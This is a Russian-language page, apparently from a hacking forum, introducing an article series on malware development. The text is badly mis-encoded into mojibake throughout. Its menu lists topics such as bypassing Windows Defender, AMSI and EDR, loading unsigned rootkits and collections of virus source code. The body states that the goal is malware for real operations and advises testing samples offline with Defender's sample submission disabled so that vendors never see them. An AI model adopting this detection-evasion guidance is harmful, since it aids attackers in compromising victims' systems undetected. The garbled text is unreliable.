									 –ß–µ—Ä–ø–∞–µ–º —Å–∏–ª—ã –≤ –∞–Ω—Ç–∏–æ—Ç–ª–∞–¥–∫–µ</a>
								
									<a href="page/obkhod-virtual-nykh-mashin.32/index.html" class="menu-linkRow ">
									 –û–±—Ö–æ–¥ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω</a>
								
									<a href="page/otkryvayem-vrata-ada.33/index.html" class="menu-linkRow ">
									 –û—Ç–∫—Ä—ã–≤–∞–µ–º –≤—Ä–∞—Ç–∞ –∞–¥–∞</a>
								
									<a href="page/umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="menu-linkRow ">
									 –£–º–µ–Ω—å—à–µ–Ω–∏–µ –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –¥–µ—Ç–µ–∫—Ç–∞ –∑–≤–µ—Ä—å–∫–∞</a>
								
									<a href="page/obkhod-windows-defender.35/index.html" class="menu-linkRow ">
									 –û–±—Ö–æ–¥ Windows defender</a>
								
									<a href="page/pro-endpoint-detection-and-response-edr.36/index.html" class="menu-linkRow ">
									 –ü—Ä–æ Endpoint Detection and Response (EDR)</a>
								
									<a href="page/pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="menu-linkRow ">
									 –ü—Ä–æ –¥–µ—Ç–µ–∫—Ç –≤ –ø–∞–º—è—Ç–∏. –ù–∏—á–µ–≥–æ –Ω–µ –ø–æ–¥–µ–ª–∞–µ—à—å –∏ —ç—Ç–æ –Ω–µ–∏–∑–±–µ–∂–Ω–æ)</a>
								
									<a href="page/ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="menu-linkRow ">
									 –û–≥—Ä–æ–º–Ω–∞—è –±–∞–∑–∞ –∏—Å—Ö–æ–¥–Ω–∏–∫–æ–≤ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤–∏—Ä—É—Å–æ–≤ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º</a>
								
									<a href="page/kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="menu-linkRow ">
									 –ö–∞–∫ RootKit –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–ª–∏ –∂–µ –∫–∞–∫ –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥—Ä–∞–π–≤–µ—Ä –±–µ–∑ –ø–æ–¥–ø–∏—Å–∏</a>
								
									<a href="page/obkhod-amsi.40/index.html" class="menu-linkRow ">
									 –û–±—Ö–æ–¥ AMSI</a>
								
									<a href="page/obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="menu-linkRow ">
									 –û–±—Ö–æ–¥ AMSI –ø—Ä–∏ –ø–æ–º–æ—â–∏ —Ö–∞—Ä–¥–≤–∞—Ä–Ω—ã—Ö —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞</a>
								
									<a href="page/uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="menu-linkRow ">
									 –£–∫–ª–æ–Ω—è–µ–º—Å—è –æ—Ç –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–æ–≥–æ –¥–µ—Ç–µ–∫—Ç–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞ –∏ EDR</a>
								
									<a href="page/obkhodim-antivirusy-i-edr.43/index.html" class="menu-linkRow ">
									 –û–±—Ö–æ–¥–∏–º –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã –∏ EDR</a>
								
									<a href="page/mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="menu-linkRow ">
									 MutationGate - –ù–æ–≤—ã–π –ø–æ–¥—Ö–æ–¥ —Ä–∞–±–æ—Ç—ã —Å —Å–∏—Å–∫–æ–ª–∞–º–∏</a>
								
									<a href="page/razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="menu-linkRow ">
									 –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞—Å—Ç–æ—è—â–µ–≥–æ –≤–∏—Ä—É—Å–∞ –≤ 2024 –≥–æ–¥—É</a>
								
							
							
								<a href="index9401.html?full=1" class="menu-linkRow is-selected">–ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤—Å—é —Å—Ç–∞—Ç—å—é</a>
							
						</div>
					</div>
				</div>
			

			

			
		
		</div>
	
				
			
			</div>
		</div>
	

	
	
		
	
	
	
	<div class="block-container">
		<div class="block-body lbContainer js-articleBody"
			data-xf-init="lightbox"
			data-lb-id="article-6"
			data-lb-caption-desc="0x42 &middot; 08.05.2025 –≤ 13:54"
			id="js-articleBody-6">

			<div class="articleBody">
				<article class="articleBody-main js-lbContainer">
					
					
					
					
						

	
		
	

					

					

						
							<h2>–ó–∞—á–µ–º –∏–∑—É—á–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º ?</h2>
						

						<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png"
		data-src="https://osint42.org/attachments/872828dd-ac69-4f8f-8ea3-10beaea13fb9-png.461/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/872828dd-ac69-4f8f-8ea3-10beaea13fb9-png.461/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png"
			title="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
–í—Å–µ–º –ø—Ä–∏–≤–µ—Ç!<br />
<br />
–†–µ—à–∏–ª –ø–µ—Ä–µ–ø–æ—Å—Ç–∏—Ç—å —Å–≤–æ–π —Ü–∏–∫–ª —Å—Ç–∞—Ç–µ–π –ø–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –º–∞–ª–≤–∞—Ä–∏.<br />
<br />
–°—Ç–∞—Ç—å–∏ –±—É–¥—É—Ç –æ—Ñ–æ—Ä–º–ª–µ–Ω—ã –≤ –≤–∏–¥–µ —Ü–∏–∫–ª–∞ —Å—Ç–∞—Ç–µ–π.)<br />
<br />
<b><u>–ó–∞—á–µ–º –∏–∑—É—á–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º ?</u></b><br />
<br />
–ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏—á–∏–Ω, –ø–æ –∫–æ—Ç–æ—Ä—ã–º –∫—Ç–æ-—Ç–æ —Ö–æ—Ç–µ–ª –±—ã –∏–∑—É—á–∏—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º.<br />
<br />
–° —Ç–æ—á–∫–∏ –∑—Ä–µ–Ω–∏—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–µ —á–∞—Å—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –∑–∞–¥–∞—á–∏ –≤ —Å—Ä–µ–¥–µ –∫–ª–∏–µ–Ω—Ç–∞.<br />
<br />
–£ —Ç–µ—Å—Ç–∏—Ä–æ–≤—â–∏–∫–æ–≤ –æ–±—ã—á–Ω–æ –µ—Å—Ç—å —Ç—Ä–∏ –æ—Å–Ω–æ–≤–Ω—ã—Ö –≤–∞—Ä–∏–∞–Ω—Ç–∞ –≤—ã–±–æ—Ä–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –∞—Ç–∞–∫–∏:<br />
<br />
1. –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Å –æ—Ç–∫—Ä—ã—Ç—ã–º –∏—Å—Ö–æ–¥–Ω—ã–º –∫–æ–¥–æ–º ‚Äî —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—é—Ç—Å—è –ª—é–±—ã–º —Å—Ä–µ–¥—Å—Ç–≤–∞–º–∏ –∑–∞—â–∏—Ç—ã –∏ –±–µ–∑ –∫–∞–∫–∏—Ö-—Ç–æ –¥–æ—Ä–∞–±–æ—Ç–æ–∫ –º–∞–ª–æ –ø—Ä–∏–≥–æ–¥–Ω—ã –¥–ª—è –∞—Ç–∞–∫.<br />
<br />
2. –ü–æ–∫—É–ø–∫–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤. –ö–æ–º–∞–Ω–¥—ã —Å –±–æ–ª—å—à–∏–º–∏ –±—é–¥–∂–µ—Ç–∞–º–∏ —á–∞—Å—Ç–æ –ø—Ä–µ–¥–ø–æ—á–∏—Ç–∞—é—Ç –ø–æ–∫—É–ø–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã, —á—Ç–æ–±—ã —Å—ç–∫–æ–Ω–æ–º–∏—Ç—å –¥—Ä–∞–≥–æ—Ü–µ–Ω–Ω–æ–µ –≤—Ä–µ–º—è –≤–æ –≤—Ä–µ–º—è –∑–∞–¥–∞–Ω–∏–π.<br />
<br />
3. –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤. –ü–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Å–æ–∑–¥–∞—é—Ç—Å—è –ø–æ –∏–Ω–¥–∏–≤–∏–¥—É–∞–ª—å–Ω–æ–º—É –∑–∞–∫–∞–∑—É, –æ–Ω–∏ –∏–º–µ—é—Ç –±–æ–ª—å—à–µ —à–∞–Ω—Å–æ–≤ –Ω–∞–π—Ç–∏ –∫–∞–∫–∏–µ-—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º–µ –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–∞–∫–∏–µ-—Ç–æ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —á–∞—Å—Ç–∏ —Å–∏—Å—Ç–µ–º—ã.<br />
–ò–º–µ–Ω–Ω–æ –∑–¥–µ—Å—å –∑–Ω–∞–Ω–∏—è –æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º —Å—Ç–∞–Ω–æ–≤—è—Ç—Å—è –ø–µ—Ä–≤–æ—Å—Ç–µ–ø–µ–Ω–Ω—ã–º–∏ –¥–ª—è –±–æ–ª–µ–µ —É—Å–ø–µ—à–Ω–æ–π –æ—Ü–µ–Ω–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.<br />
<br />
<b>–ö–∞–∫–æ–π —è–∑—ã–∫ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è —Å–ª–µ–¥—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?</b><br />
<br />
–° —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π —Ç–æ—á–∫–∏ –∑—Ä–µ–Ω–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª—é–±–æ–π —è–∑—ã–∫ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è, –Ω–∞–ø—Ä–∏–º–µ—Ä Python, PowerShell, C#, C, C++ –∏ Go.<br />
<br />
–ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏—á–∏–Ω, –ø–æ –∫–æ—Ç–æ—Ä—ã–º –æ–¥–Ω–∏ —è–∑—ã–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–µ–æ–±–ª–∞–¥–∞—é—Ç –Ω–∞–¥ –¥—Ä—É–≥–∏–º–∏, –∫–æ–≥–¥–∞ –¥–µ–ª–æ –¥–æ—Ö–æ–¥–∏—Ç –¥–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –∏ —ç—Ç–æ<br />
–æ–±—ã—á–Ω–æ —Å–≤–æ–¥–∏—Ç—Å—è –∫ —Å–ª–µ–¥—É—é—â–∏–º –ø—É–Ω–∫—Ç–∞–º:<br />
<br />
- –ù–µ–∫–æ—Ç–æ—Ä—ã–µ —è–∑—ã–∫–∏ –Ω–µ –∏–º–µ—é—Ç –Ω—É–∂–Ω–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞, –Ω–∞–ø—Ä–∏–º–µ—Ä –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –û–ó–£ –ø–æ —É–∫–∞–∑–∞—Ç–µ–ª—è–º –∏ —Ç.–¥.<br />
<br />
- –î—Ä—É–≥–∏–µ —è–∑—ã–∫–∏ –Ω–µ –ø–æ–∑–≤–æ–ª—è—é—Ç –±—ã—Å—Ç—Ä–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω—É–∂–Ω—É—é –∑–∞–¥–∞—á—É, –Ω–∞–ø—Ä–∏–º–µ—Ä —Ç–æ—Ç-–∂–µ —è–∑—ã–∫ –°–∏ –Ω–µ –∏–º–µ–µ—Ç —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞ –∫–æ—Ç–æ—Ä—ã–º –º–æ–∂–µ—Ç –ø–æ—Ö–≤–∞—Å—Ç–∞—Ç—å—Å—è C# –∏–ª–∏ Python, –Ω–∞–ø—Ä–∏–º–µ—Ä –µ—Å—Ç—å –∑–∞–¥–∞—á–∏ –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞ —Ç–æ–º-–∂–µ Python –º–æ–∂–Ω–æ —Ä–µ—à–∏—Ç—å –∑–∞ –ø–∞—Ä—É —Å—Ç—Ä–æ—á–µ–∫ –∫–æ–¥–∞, –∞ –≤ –°–∏ —ç—Ç–æ –±—É–¥–µ—Ç –ø–æ—Ä—Ç—è–Ω–∫–∞ –Ω–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ –¥–µ—Å—è—Ç–∫–æ–≤ —Ç—ã—Å—è—á —Å—Ç—Ä–æ–∫.<br />
<br />
- –ù–æ –º–∏–Ω—É—Å—ã Python –∏ C#, —á—Ç–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–ª–∂–µ–Ω –ø—Ä–∏—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ, —á—Ç–æ —É–∂–µ –æ—Å–ª–æ–∂–Ω—è–µ—Ç –∞—Ç–∞–∫—É.<br />
<br />
- –¢–∞–∫–∂–µ –ø—Ä–∏ –≤—ã–±–æ—Ä–µ —è–∑—ã–∫–∞ –Ω—É–∂–Ω–æ —É—á–∏—Ç—ã–≤–∞—Ç—å –∑–Ω–∞–Ω–∏–µ –∏ –æ–ø—ã—Ç —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞.<br />
<br />
<b>–Ø–∑—ã–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –º–æ–∂–Ω–æ —Ä–∞–∑–¥–µ–ª–∏—Ç—å –Ω–∞ –¥–≤–µ —Ä–∞–∑–Ω—ã–µ –≥—Ä—É–ø–ø—ã: –≤—ã—Å–æ–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–µ –∏ –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–µ.</b><br />
<br />
–í—ã—Å–æ–∫–∏–π —É—Ä–æ–≤–µ–Ω—å ‚Äî –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, –±–æ–ª–µ–µ –∞–±—Å—Ç—Ä–∞–≥–∏—Ä–æ–≤–∞–Ω –æ—Ç –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã, –º–µ–Ω–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–µ–Ω –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –ø–∞–º—è—Ç—å—é –∏ —á–∞—Å—Ç–æ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–π —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª –ø—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç—É.<br />
–ü—Ä–∏–º–µ—Ä–æ–º —è–∑—ã–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –≤—ã—Å–æ–∫–æ–≥–æ —É—Ä–æ–≤–Ω—è —è–≤–ª—è–µ—Ç—Å—è Python, –°#.<br />
<br />
–ù–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–π ‚Äî –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç —Å–ø–æ—Å–æ–± –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –Ω–∞ –±–æ–ª–µ–µ –±–ª–∏–∑–∫–æ–º —É—Ä–æ–≤–Ω–µ, –∞ —Ç–∞–∫–∂–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫—É –±–æ–ª—å—à–µ —Å–≤–æ–±–æ–¥—ã –ø—Ä–∏<br />
–≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤—É—è —Å —Å–∏—Å—Ç–µ–º–æ–π. –ü—Ä–∏–º–µ—Ä –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤–æ–≥–æ —è–∑—ã–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è –°–∏, –ê—Å—Å–µ–º–±–ª–µ—Ä.<br />
<br />
<b>–û—Ç–º–µ—á—É —ç—Ç–æ —Ä–∞–∑–¥–µ–ª–µ–Ω–∏–µ —É—Å–ª–æ–≤–Ω–æ–µ, –Ω–æ –Ω—É–∂–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å –µ—â—ë, —á—Ç–æ –µ—Å—Ç—å —è–∑—ã–∫–∏ –∫–æ—Ç–æ—Ä—ã–µ —Ç—Ä–µ–±—É—é—Ç –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã (Python, Java –∏ —Ç.–¥.) –∏ –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ —Ç—Ä–µ–±—É—é—Ç, —Ç.–µ. –±—É–¥–µ—Ç —Å–æ–±—Ä–∞–Ω –±–∏–Ω–∞—Ä–Ω—ã–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π –æ–±—Ä–∞–∑, –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –∫–æ—Ç–æ—Ä–æ–≥–æ –Ω–∏—á–µ–≥–æ –Ω–µ –Ω—É–∂–Ω–æ (–¢–∞–∫–∏–µ –∫–∞–∫ –°–∏, –°++, Rust –∏ —Ç.–¥.).<br />
<br />
–†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –¥–ª—è Windows</b><br />
<br />
–°—Ü–µ–Ω–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –¥–ª—è Windows –∏–∑–º–µ–Ω–∏–ª–∞—Å—å –∑–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ –ª–µ—Ç –∏ —Ç–µ–ø–µ—Ä—å –≤ –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ–π —Å—Ç–µ–ø–µ–Ω–∏ —Å–æ—Å—Ä–µ–¥–æ—Ç–æ—á–µ–Ω–∞ –Ω–∞ –æ–±—Ö–æ–¥–µ –∑–∞—â–∏—Ç—ã.<br />
–° —Ä–∞–∑–≤–∏—Ç–∏–µ–º —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–∏ —É–∂–µ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å–æ–∑–¥–∞–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û, –∫–æ—Ç–æ—Ä–æ–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –∏–ª–∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç ¬´–≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ¬ª –¥–µ–π—Å—Ç–≤–∏—è.<br />
<br />
<b>–¶–µ–ª—å—é —ç—Ç–∏—Ö —Å—Ç–∞—Ç–µ–π –Ω–∞—É—á–∏—Ç—å –≤–∞—Å —Å–æ–∑–¥–∞–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û, –∫–æ—Ç–æ—Ä–æ–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö –±–æ–µ–≤—ã—Ö –¥–µ–π—Å—Ç–≤–∏—è—Ö.<br />
<br />
–ñ–∏–∑–Ω–µ–Ω–Ω—ã–π —Ü–∏–∫–ª —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û</b><br />
<br />
–ü–æ —Å—É—Ç–∏, –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û ‚Äî —ç—Ç–æ —á–∞—Å—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–Ω–∞—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π. –£—Å–ø–µ—à–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è —Ç—Ä–µ–±—É–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å–∞<br />
–∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ –∫–∞–∫ –∂–∏–∑–Ω–µ–Ω–Ω—ã–π —Ü–∏–∫–ª —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è (SDLC).<br />
<br />
–¢–æ—á–Ω–æ —Ç–∞–∫ –∂–µ —Ö–æ—Ä–æ—à–æ –ø–æ—Å—Ç—Ä–æ–µ–Ω–Ω–æ–µ –∏ —Å–ª–æ–∂–Ω–æ–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û –ø–æ—Ç—Ä–µ–±—É–µ—Ç —Å–ø–µ—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–∏ SDLC, –Ω–∞–∑—ã–≤–∞–µ–º—ã–π –∂–∏–∑–Ω–µ–Ω–Ω—ã–º —Ü–∏–∫–ª–æ–º —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º (MDLC).<br />
<br />
<b>MDLC –º–æ–∂–µ—Ç —Å–æ—Å—Ç–æ—è—Ç—å –∏–∑ 5 –æ—Å–Ω–æ–≤–Ω—ã—Ö —ç—Ç–∞–ø–æ–≤:</b><br />
<br />
1. –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞. –ù–∞—á–Ω–∏—Ç–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –∏–ª–∏ —É—Å–æ–≤–µ—Ä—à–µ–Ω—Å—Ç–≤–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û.<br />
<br />
2. –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ. –í—ã–ø–æ–ª–Ω–∏—Ç–µ —Ç–µ—Å—Ç—ã, —á—Ç–æ–±—ã –≤—ã—è–≤–∏—Ç—å —Å–∫—Ä—ã—Ç—ã–µ –æ—à–∏–±–∫–∏ –≤ —É–∂–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–º –∫–æ–¥–µ.<br />
<br />
3. –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ AV/EDR –≤ –∞–≤—Ç–æ–Ω–æ–º–Ω–æ–º —Ä–µ–∂–∏–º–µ. –ó–∞–ø—É—Å–∫–∞–π—Ç–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û —Å –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –≤–æ–∑–º–æ–∂–Ω—ã–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ–º –ø—Ä–æ–¥—É–∫—Ç–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –í–∞–∂–Ω–æ, —á—Ç–æ–±—ã —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–≤–æ–¥–∏–ª–æ—Å—å –≤ –∞–≤—Ç–æ–Ω–æ–º–Ω–æ–º —Ä–µ–∂–∏–º–µ, <b>—á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –æ–±—Ä–∞–∑—Ü—ã –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞–º —Å—Ä–µ–¥—Å—Ç–≤ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.</b><br />
<br />
–ü—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ Microsoft Defender —ç—Ç–æ –¥–æ—Å—Ç–∏–≥–∞–µ—Ç—Å—è –∑–∞ —Å—á–µ—Ç –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ–±—Ä–∞–∑—Ü–æ–≤ –∏ –æ–±–ª–∞—á–Ω–æ–π –∑–∞—â–∏—Ç—ã.<br />
